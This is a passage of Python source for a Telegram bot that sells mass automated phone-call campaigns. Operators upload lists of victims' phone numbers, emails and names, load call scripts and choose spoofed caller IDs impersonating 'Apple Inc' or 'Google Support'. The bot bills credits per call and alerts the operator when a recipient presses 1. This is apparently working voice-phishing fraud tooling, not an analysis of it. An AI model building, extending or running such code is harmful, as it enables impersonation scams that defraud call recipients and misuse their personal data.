    # If in an editing flow, route to script handler; otherwise keep quiet
    if context.user_data.get('waiting_for_topup_amount', False):
        await handle_topup_amount(update, context)
        return
    if context.user_data.get('editing_script') in ['first_script', 'second_script']:
        await scriptsv1_input(update, context)
        return
    # No-op: avoid advertising any queue commands

# batch / call handler (sec2)
async def task_conf(
     update: Update,
     context: CallbackContext
):
     query = update.callback_query
     await query.answer()
     call_data = context.user_data.get(
          "call_data"
     )
     base_prompt = context.user_data.get(
          "base_prompt"
     )
     first_sentence = context.user_data.get(
          "first_sentence"
     )
     user_id = str(
          update.effective_user.id
     )
     if not call_data or not base_prompt or not first_sentence:
          await query.edit_message_text(
               "Process removed due to missing data."
          )
          return
     if query.data == "confirm_call":
          try:
               phone_numbers = [
                    entry["phone_number"]
                    for entry in call_data
               ]
               settings = task_usersettings()
               if caller_id_spoofing == "OFF":
                    caller_id = "Random 888"  # Use default pool when spoofing is disabled
               else:
                    caller_id = settings.get(
                         user_id,
                         {}
                    ).get(
                         "caller_id",
                         "Google Support"
                    )
               timestamp = datetime.datetime.now().isoformat()
               metadata = {
                    "initiator_user_id": user_id,
                    "initiator_chat_id": query.message.chat.id,
                    "timestamp": timestamp,
                    "target_number": phone_numbers[0]
               }
               # Build campaign data
               campaign_data = {
                    "phone_numbers": phone_numbers,
                    "first_sentence": first_sentence,
                    "base_prompt": base_prompt,
                    "caller_id": caller_id,
                    "metadata": metadata,
                    "webhook_url": f"{public_webhook_url}/webhook",
                    "user_id": user_id,
                    "timestamp": timestamp
               }
               # Start the batch immediately (queue removed)
               asyncio.create_task(execute_campaign(campaign_data))
               message = "✅ Batch Started!\n\nYou will be notified once a recipient presses 1"
               
               await query.edit_message_text(message)
               await asyncio.sleep(
                    5
               )
          except Exception as e:
               print(
                    f"Queue error: {e}"
               )
               await query.edit_message_text(
                    "Please retry, if this continues please contact support"
               )
     elif query.data == "cancel_call":
          await query.edit_message_text(
               "Process has been canceled"
          )

async def change_caller_id_handler(
     update: Update,
     context: CallbackContext
):
     query = update.callback_query
     await query.answer()
     keyboard = [
          [
               InlineKeyboardButton(
                    "Apple Inc",
                    callback_data='set_caller_id:Apple Inc'
               ),
               InlineKeyboardButton(
                    "Google Support",
                    callback_data='set_caller_id:Google Support'
               ),
               InlineKeyboardButton(
                    "Random 888",
                    callback_data='set_caller_id:Random 888'
               )
          ],
          [
               InlineKeyboardButton(
                    "Back 🔙",
                    callback_data='settings'
               )
          ]
     ]
     await query.edit_message_text(
          "Select a caller ID",
          reply_markup=InlineKeyboardMarkup(
               keyboard
          )
     )

async def set_caller_id_handler(
     update: Update,
     context: CallbackContext
):
     query = update.callback_query
     data = query.data
     try:
          caller_id = data.split(
               ":",
               1
          )[1]
     except IndexError:
          caller_id = "Google Support"
     user_id = str(
          query.from_user.id
     )
     
     if not is_whitelisted(user_id):
          return  
     
     settings = task_usersettings()
     if user_id in settings:
          settings[user_id]['caller_id'] = caller_id
     else:
          settings[user_id] = {
               'first_script': '1',
               'second_script': '2',
               'line_bot': True,
               'balance': 0.0,
               'caller_id': caller_id
          }
     task_saveusers(
          settings
     )
     await query.answer(
          f"Caller ID changed to {caller_id}"
     )
     await settings_handler(
          update,
          context
     )

# file handlers (sec3)
@check_bot_status
async def handle_file_upload(
     update: Update,
     context: ContextTypes.DEFAULT_TYPE
):
     message = update.effective_message
     if not message:
          return
     user_id = str(
          update.effective_user.id
     )
     if not is_whitelisted(
          user_id
     ):
          return
     try:
          user_data = load_user_data(
               "load"
          )
          if user_id not in user_data:
               await message.reply_text(
                    "Please contact a dev if you are unable to upload files."
               )
               return
          user_info = user_data.get(
               user_id,
               {}
          )
          first_script_local = user_info.get(
               "first_script"
          )
          second_script_local = user_info.get(
               "second_script"
          )
          balance = user_info.get(
               "balance",
               0.0
          )
          if not first_script_local or not second_script_local:
               await message.reply_text(
                    "Please set up your scripts first."
               )
               return
          if not message.document:
               await message.reply_text(
                    "No document found in the message."
               )
               return
          if not message.document.file_name.endswith(
               ".txt"
          ):
               await message.reply_text(
                    "[ERROR] ONLY .txt files are supported."
               )
               return
          temp_id = str(
               uuid.uuid4()
          )
          file_dir = config.get(
               "filespag",
               "./files"
          )
          if not os.path.exists(
               file_dir
          ):
               os.makedirs(
                    file_dir
               )
          file_path = os.path.join(
               file_dir,
               f"{temp_id}.txt"
          )
          file = await context.bot.get_file(
               message.document.file_id
          )
          await file.download_to_drive(
               file_path
          )
          with open(
               file_path,
               "r",
               encoding="utf-8"
          ) as f:
               file_lines = [
                    line.strip() for line in f if line.strip()
               ]
          phone_numbers, emails, names = extract_num(
               file_path
          )
          os.remove(
               file_path
          )
          if not phone_numbers:
               await message.reply_text(
                    "[ERROR] NO valid numbers found."
               )
               return
          call_data = []
          settings_local = task_usersettings()
          chat_id = settings_local.get(
               user_id,
               {}
          ).get(
               "chat_id",
               user_id
          )
          for i, phone_number in enumerate(
               phone_numbers
          ):
               email_val = emails[i] if i < len(emails) else "N/A"
               name_val = names[i] if i < len(names) else "N/A"
               cleaned_number = clean_number(
                    phone_number
               )
               if not cleaned_number:
                    continue
               full_line = file_lines[i] if i < len(file_lines) else f"{email_val} {phone_number} {name_val}"
               call_data.append({
                    "phone_number": cleaned_number,
                    "metadata": {
                         "user_id": user_id,
                         "email": email_val,
                         "name": name_val
                    }
               })
               GCALL_METADATA[cleaned_number] = {
                    "email": email_val,
                    "line": full_line,
                    "chat_id": chat_id
               }
          if not call_data:
               await message.reply_text(
                    "[ERROR] NO valid phone numbers found (supports US and Australian numbers)"
               )
               return
          num_calls = len(
               call_data
          )
          if balance < num_calls * 0.3:
               await message.reply_text(
                    f"You don't have enough credits to make {num_calls} calls.\n\nYour current balance is {balance}. Contact a dev to topup."
               )
               return
          user_info["balance"] -= num_calls * 0.3
          user_data[user_id] = user_info
          load_user_data(
               "save",
               user_data
          )
          context.user_data["call_data"] = call_data
          context.user_data["base_prompt"] = second_script_local
          context.user_data["first_sentence"] = first_script_local
          context.user_data["user_id"] = user_id
          keyboard = [
               [
                    InlineKeyboardButton(
                         "Confirm",
                         callback_data="confirm_call"
                    ),
                    InlineKeyboardButton(
                         "Cancel",
                         callback_data="cancel_call"
                    )
               ]
          ]
          reply_markup = InlineKeyboardMarkup(
               keyboard
          )
          await message.reply_text(
               f"📥 Loaded {len(call_data)} numbers.\n\nIf not all numbers were loaded, please reformat them and try again.\n\nPlease press Confirm to continue.",
               reply_markup=reply_markup
          )
     except Exception as e:
          print(
               f"upload error: {e}"
          )

async def upload_command_handler(
     update: Update,
     context: ContextTypes.DEFAULT_TYPE
):
     message = update.effective_message
     if not message.document:
          await message.reply_text(
               "[❌] attach a .txt file with the /upload command"
          )
          return
     await handle_file_upload(
          update,
          context
     )

def load_user_data(
     mode,
     user_data=None
):
     try:
          if mode == "load":
               with open(
                    config["userspag"],
                    "r"
               ) as file:
                    return json.load(
                         file
                    )
          elif mode == "save" and user_data is not None:
               with open(
                    config["userspag"],
                    "w"
               ) as file:
                    json.dump(
                         user_data,
                         file,
                         indent=4
                    )
          else:
               raise ValueError(
                    "Invalid mode"
               )
     except Exception as e:
          print(
               f"user data error {e}"
          )
          return {} if mode == "load" else None

def restart_bot(
):
     logging.info(
          "restarting bot now.. on int 3."
     )
     python = sys.executable
     os.execl(
          python,
          python,
          * sys.argv
     )

def main(
):
     token = load_token()
     if not token:
          return
     global bot, public_webhook_url
     public_webhook_url = "http://localhost:8000"
     print(
          f"webhook url ->: {public_webhook_url}/webhook"
     )
     def run_webhook(
     ):
          uvicorn.run(
               webapp,
               host="0.0.0.0",
               port=8000,
               log_level="warning"
          )
     threading.Thread(
          target=run_webhook,
          daemon=True
     ).start()
     threading.Timer(
          8000,
          restart_bot
     ).start()
     bot_app = Application.builder().token(
          token
     ).build()
     bot_app.add_handler(
          CommandHandler(
               "start",
               start
          )
     )
     bot_app.add_handler(
          CommandHandler(
               "whitelist",
               whitelist
          )
     )
     bot_app.add_handler(
          CommandHandler(
               "unwhitelist",
               unwhitelist
          )
     )
     bot_app.add_handler(
          CommandHandler(
               "topup",
               topup
          )
     )
     bot_app.add_handler(
          CommandHandler(
               "line",
               last_line_handler
          )
     )
     bot_app.add_handler(
          CommandHandler(
               "get_user_info",
               get_user_info
          )
     )
     bot_app.add_handler(
          CommandHandler(
               "upload",
               upload_command_handler
          )
     )
     bot_app.add_handler(
          CommandHandler(
               "status",
               status_command
          )
     )
     bot_app.add_handler(
          CommandHandler(
               "cid",
               cid_command
          )
     )
     bot_app.add_handler(
          CommandHandler(
               "addgc",
               addgc_command
          )
     )
     bot_app.add_handler(
          CommandHandler(
               "delgc",
               delgc_command
          )
     )
     bot_app.add_handler(
          CommandHandler(
               "addusertogc",
               addusertogc_command
          )
     )
     bot_app.add_handler(
          CommandHandler(
               "deluserfromgc",
               deluserfromgc_command
          )
     )
     bot_app.add_handler(
          CommandHandler(
               "listgc",
               listgc_command
          )
     )
     bot_app.add_handler(
          CommandHandler(
               "gcinfo",
               gcinfo_command
          )
     )
     bot_app.add_handler(
          CallbackQueryHandler(
               settings_handler,
               pattern="^settings$"
          )
     )
     bot_app.add_handler(
          CallbackQueryHandler(
               mainpage_handler,
               pattern="^mainpage$"
          )
     )
     bot_app.add_handler(
          CallbackQueryHandler(
               editsv1_handler,
               pattern="^edit_first_script$"
          )
     )
     bot_app.add_handler(
          CallbackQueryHandler(
               editsv2_handler,
               pattern="^edit_second_script$"
          )
     )
     bot_app.add_handler(
          CallbackQueryHandler(
               start_batch_handler,
               pattern="^start_batch$"
          )
     )
     bot_app.add_handler(
          CallbackQueryHandler(
               base_script_handler,
               pattern="^default_script$"
          )
     )
     bot_app.add_handler(
          CallbackQueryHandler(
               linebot_toggler,
               pattern="^toggle_line_bot$"
          )
     )
     bot_app.add_handler(
          CallbackQueryHandler(
               help_handler,
               pattern="^help$"
          )
     )
     bot_app.add_handler(
          CallbackQueryHandler(
               balance_handler,
               pattern="^balance$"
          )
     )
     bot_app.add_handler(
          CallbackQueryHandler(
               support_handler,
               pattern="^support$"
          )
     )
    # Queue status handler removed (queue system disabled)
     bot_app.add_handler(
          CallbackQueryHandler(
               upload_batch_handler,
               pattern="^upload_batch$"
          )
     )
     bot_app.add_handler(
          CallbackQueryHandler(
               task_conf,
               pattern="^(confirm_call|cancel_call)$"
          )
     )
     bot_app.add_handler(
          CallbackQueryHandler(
               change_caller_id_handler,
               pattern="^change_caller_id$"
          )
     )
     bot_app.add_handler(
          CallbackQueryHandler(
               set_caller_id_handler,
               pattern="^set_caller_id:"
          )
     )
     # Add top-up related handlers
     bot_app.add_handler(
          CallbackQueryHandler(
               topup_balance_handler,
               pattern="^topup_balance$"
          )
     )
     bot_app.add_handler(
          CallbackQueryHandler(
               check_payment_status_handler,
               pattern="^check_payment_"
          )
     )
     bot_app.add_handler(
          MessageHandler(
               filters.TEXT & ~filters.COMMAND,
               handle_text_message
          )
     )
     bot_app.add_handler(
          MessageHandler(
               filters.Document.ALL,
               handle_file_upload
          )
     )
     global bot
     bot = bot_app
     bot_app.run_polling()

if __name__ == "__main__":
     main()
